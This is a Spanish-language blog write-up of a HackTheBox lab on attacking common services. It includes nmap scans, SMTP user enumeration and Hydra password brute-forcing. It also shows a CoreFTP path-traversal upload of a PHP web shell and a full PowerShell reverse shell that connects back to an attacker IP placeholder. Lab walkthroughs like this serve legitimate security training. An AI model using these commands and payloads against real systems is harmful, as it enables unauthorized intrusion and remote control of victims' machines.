<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>
    
    Laboratorio De Ataques a Servicios Comunes - Fácil | 
    
    CHL Blog
</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="canonical" href="http://localhost:1313/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-a-servicios-comunes---f%C3%A1cil/" />
<link rel="icon" type="image/png" href="http://localhost:1313/image/favicon.ico">


<meta name="description" content="
    En este laboratorio explotamos servicios comunes como FTP, HTTPS y SMTP para obtener acceso a un sistema Windows. El ejercicio pone en práctica técnicas de enumeración, fuerza bruta, explotación web y post-explotación básica.
    "
/>
<meta property="og:description" content="
    En este laboratorio explotamos servicios comunes como FTP, HTTPS y SMTP para obtener acceso a un sistema Windows. El ejercicio pone en práctica técnicas de enumeración, fuerza bruta, explotación web y post-explotación básica.
    " 
/>




<meta property="og:title" content="Laboratorio de Ataques a Servicios Comunes - Fácil" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-a-servicios-comunes---f%C3%A1cil/" /><meta property="article:section" content="pagina_web" />
<meta property="article:published_time" content="2025-06-12T00:00:00+00:00" />
<meta property="article:modified_time" content="2025-06-12T00:00:00+00:00" />





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Laboratorio de Ataques a Servicios Comunes - Fácil">
  <meta name="twitter:description" content="En este laboratorio explotamos servicios comunes como FTP, HTTPS y SMTP para obtener acceso a un sistema Windows. El ejercicio pone en práctica técnicas de enumeración, fuerza bruta, explotación web y post-explotación básica.">


  <meta itemprop="name" content="Laboratorio de Ataques a Servicios Comunes - Fácil">
  <meta itemprop="description" content="En este laboratorio explotamos servicios comunes como FTP, HTTPS y SMTP para obtener acceso a un sistema Windows. El ejercicio pone en práctica técnicas de enumeración, fuerza bruta, explotación web y post-explotación básica.">
  <meta itemprop="datePublished" content="2025-06-12T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-06-12T00:00:00+00:00">
  <meta itemprop="wordCount" content="583">
  <meta itemprop="keywords" content="Hackthebox,FTP,Smtp,Php,Reverse-Shell,Rce,Windows,Powershell">




<link rel="stylesheet" href="http://localhost:1313/main.min.css">





<script src="http://localhost:1313/bundle.js"></script>







<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>









</head>

<body><header id="header">
  <div class="top-bar">
    <div class="container-md">

      <div class="row align-items-center">
        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
          <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
        </div>

        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <i class="fas fa-bars"></i>
          </button>
        </div>

        <div class="col-6 col-sm-4">
          <h2 class="title"><a href="http://localhost:1313/">CHL Blog</a></h2>
        </div>

        
        <div class="col-3 col-sm-4">
          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
              role="search">
              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
              <button class="btn" type="submit">
                <i class="fa fa-search"></i>
              </button>
            </form>
          </div>
        </div>
        

      </div>
    </div>
  </div>

  <div class="container-md">
    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav mx-auto">

          <li class="nav-item d-block d-sm-none">
            <ul class="social-buttons">
              <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
            </ul>
          </li>

          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="http://localhost:1313/">
              Home
            </a>
          </li>
          
          
          
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
              Blog
            </a>
            <div class="dropdown-menu">
              
              
                <a class="dropdown-item" href="http://localhost:1313/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
              
              
              
                <a class="dropdown-item" href="http://localhost:1313/pagina_web/blog/write-ups/">Write-ups</a>
              
              
              
                <div class="dropdown-divider"></div>
              
              
              
                <a class="dropdown-item" href="http://localhost:1313/tags/">Búsqueda por etiquetas</a>
              
              
            </div>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="http://localhost:1313/pagina_web/trayectoria/">
              Trayectoria
            </a>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="http://localhost:1313/pagina_web/contact/">
              Contacto
            </a>
          </li>
          
          
        </ul>

        
        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
          onsubmit="return executeQuery('xs');" role="search">
          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
          <button class="btn" type="submit">
            <i class="fa fa-search"></i>
          </button>
        </form>
        

      </div>
    </nav>
  </div>
</header>

<main class="blog-content">
    <div class="container-md">
        <div class="row">
            
            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-left-offset"></div>
                
            </div>

            <div class="col-md-12 col-lg-8 px-lg-4">
                

                <h1 class="title">Laboratorio de Ataques a Servicios Comunes - Fácil</h1>

                <div class="container-fluid px-0 mb-4">
                    <div class="row align-items-end">
                        <div class="col-md-4 date-time">
                            <span class="date">
    Jun 12, 2025
</span>
                            &centerdot;
                            <span class="time-to-read">
    3 mins read</span>
                        </div>

                        <div class="col-md-8 tags ">
                            
                            <a href="http://localhost:1313/tags/hackthebox"><span
                                    class="tag bg-dark">hackthebox</span></a>
                            
                            <a href="http://localhost:1313/tags/ftp"><span
                                    class="tag bg-dark">ftp</span></a>
                            
                            <a href="http://localhost:1313/tags/smtp"><span
                                    class="tag bg-dark">smtp</span></a>
                            
                            <a href="http://localhost:1313/tags/php"><span
                                    class="tag bg-dark">php</span></a>
                            
                            <a href="http://localhost:1313/tags/reverse-shell"><span
                                    class="tag bg-dark">reverse-shell</span></a>
                            
                            <a href="http://localhost:1313/tags/rce"><span
                                    class="tag bg-dark">rce</span></a>
                            
                            <a href="http://localhost:1313/tags/windows"><span
                                    class="tag bg-dark">windows</span></a>
                            
                            <a href="http://localhost:1313/tags/powershell"><span
                                    class="tag bg-dark">powershell</span></a>
                            
                        </div>
                    </div>
                </div>

                

                <p><img src="../../../../../images/Miniaturas/Attacking_Common_Services.png" alt=""></p>
<h4 id="enunciado">Enunciado</h4>
<p>Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red. Durante una reunión con el cliente, nos informaron que muchos usuarios internos utilizan este host como host de acceso directo. El objetivo es proteger los archivos que contienen información confidencial.</p>
<p>Antes de nada debemos ir a nuestro <code>/etc/hosts</code> y añadir a nuestro registro la ip dada con el dominio <code>inlanefreight.htb</code>.
Recordemos también descargar los recursos que nos dan en el módulo de wordlists de usuarios y contraseñas.</p>
<h4 id="enumeración-de-puertos"><strong>Enumeración de puertos</strong></h4>
<p>Iniciamos la enumeración de servicios para identificar los puertos y protocolos activos en la máquina objetivo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -sS --min-rate <span style="color:#ae81ff">2000</span> -n -Pn &lt;IP&gt;
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/nmap1.png" alt="">
Vemos que tenemos los puertos 21, 25, 80, 443, 587, 3306, 3389 abiertos, vamos a recoger más información de los servicios que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p21,25,80,443,587,3306,3389 -sCV -n -Pn &lt;IP&gt;
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/nmap2.png" alt="">
Vemos un Apache en el puerto 80, nos está redirigiendo también a un dashboard.</p>
<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/nmap3.png" alt="">
Vemos que por https la solicitud devuelve un código de estado 401 unauthorized, luego le echamos un vistazo.</p>
<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/nmap4.png" alt="">
Vemos por el puerto 587 un servidor de correo <code>hmailServer</code>, luego tenemos una base de datos <code>MariaDB</code>, además de un servicio de <code>RDP</code> por el 3389.</p>
<p>Vale vamos a ir enumerando servicios:
Por FTP y HTTP no vi nada interesante. Vemos que la versión de php que usa es la 7.4.29
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/http1.png" alt="">
Vemos que por https nos pide que nos autentiquemos sin embargo no tenemos credenciales aún.
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/https1.png" alt=""></p>
<p>Seguimos con el servidor de correos por el puerto <code>587</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smtp-user-enum -M RCPT -U /.../users.list -D inlanefreight.htb -t &lt;IP&gt;
</span></span></code></pre></div><p>Y vemos lo siguiente.</p>
<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/smtp1.png" alt="">
Obtenemos aqui un usuario válido. <code>fiona</code>
Ahora vamos a intentar obtener su contraseña.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.60.6
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/hydra1.png" alt="">
Y con fuerza bruta obtenemos por aquí su contraseña.</p>
<p>Luego utilizando esas credenciales vemos por https lo siguiente:
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/https2.png" alt="">
Al acceder al archivo <code>WebServersInfo.txt</code> vemos esto:</p>
<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/core1.png" alt="">
El archivo WebServersInfo.txt nos está indicando que es posible acceder a recursos vía <code>curl</code> utilizando autenticación básica sobre HTTPS.
Luego busqué los siguiente:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit coreftp
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/search1.png" alt="">
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/search2.png" alt="">
Hacemos la prueba:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -X PUT -H <span style="color:#e6db74">&#34;Host: &lt;IP&gt;&#34;</span> 
</span></span><span style="display:flex;"><span>--basic -u fiona:987654321 
</span></span><span style="display:flex;"><span>--data-binary <span style="color:#e6db74">&#34;PoC.&#34;</span> 
</span></span><span style="display:flex;"><span>--path-as-is https://&lt;IP&gt;/../../../../../../whoops
</span></span></code></pre></div><p>Y nos responde correctamente:
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/core2.png" alt="">
Entonces vamos a hacer un PUT donde subamos una instrucción y nos interprete el servidor los comandos desde php, dado que lo vamos a introducir en el directorio donde esta montado el servidor Apache.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -X PUT -H <span style="color:#e6db74">&#34;Host: &lt;IP&gt;&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--basic -u fiona:987654321 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data-binary <span style="color:#e6db74">&#34;&lt;?php system(\$_GET[\&#34;cmd\&#34;]); ?&gt;&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--path-as-is https://&lt;IP&gt;/../../../../../../xampp/htdocs/req.php
</span></span></code></pre></div><p>Y al consumir este recurso
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/core4.png" alt=""></p>
<p>Confirmando así que tenemos ejecución remota de comandos. Con lo que vamos a lanzarnos una reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -X PUT -H <span style="color:#e6db74">&#34;Host: &lt;IP_victima&gt;&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--basic -u fiona:987654321 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data-binary <span style="color:#e6db74">&#34;&lt;?php exec(&#39;powershell -NoP -NonI -W Hidden -Command \&#34;\$client = New-Object System.Net.Sockets.TCPClient(\&#39;&lt;IP_atacante&gt;\&#39;,4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2&gt;&amp;1 | Out-String );\$sendback2  = \$sendback + \&#39;PS \&#39; + (pwd).Path + \&#39;&gt; \&#39;;\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\&#34;&#39;); ?&gt;&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--path-as-is https://&lt;IP_victima&gt;/../../../../../../xampp/htdocs/pwshell.php
</span></span></code></pre></div><p>Nos ponemos en escucha:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p>Y consumimos el recurso:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#34;Host: &lt;IP_victima&gt;&#34;</span> --basic -u fiona:987654321 http://&lt;IP_victima&gt;/pwshell.php
</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/core6.png" alt=""></p>
<p>Ya estando dentro del servidor buscamos la flag.
<img src="../../../../../images/HTB_modulos/common_services_htb_labs_1/core7.png" alt=""></p>
<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>


                <div id="social-media-share">
	<p><i>Escríbeme por cualquiera de las vías</i></p>
	
	<div class="share-buttons">
	    
		<a href="https://www.instagram.com/19chl96/" 
   			target="_blank" 
   			title="Sígueme en Instagram">
    		<img src=http://localhost:1313/icons/45px/instagram.png alt="Instagram">
		</a>

		<a  href="https://www.linkedin.com/in/chlinked/"
	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
	        title="Share on LinkedIn. Opens in a new window." >
	        <img src=http://localhost:1313/icons/48px/linkedin.png>
	    </a>

	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
   		   target="_blank" 
   		   title="Enviar correo usando Gmail">
    	<img src=http://localhost:1313/icons/48px/email.png alt="Email">
		</a>

		

	</div>
</div>



                
                <br>
                <div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = '';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            </div>

            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-right-offset"></div>
                
            </div>
        </div>
    </div>
</main>

<footer class="bg-dark text-light py-4">
    <div class="container-md">
        <div class="row justify-content-center">
            <div class="col-12">
                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="http://localhost:1313/">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://localhost:1313/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="http://localhost:1313/pagina_web/blog/write-ups/">Write-ups</a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>
    <div class="text-center mt-3">
        <p>© 2025 Carlos Hernández Lorenzo</p>
    </div>
</footer>


<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
<gcse:searchresults-only></gcse:searchresults-only>

</body>

</html>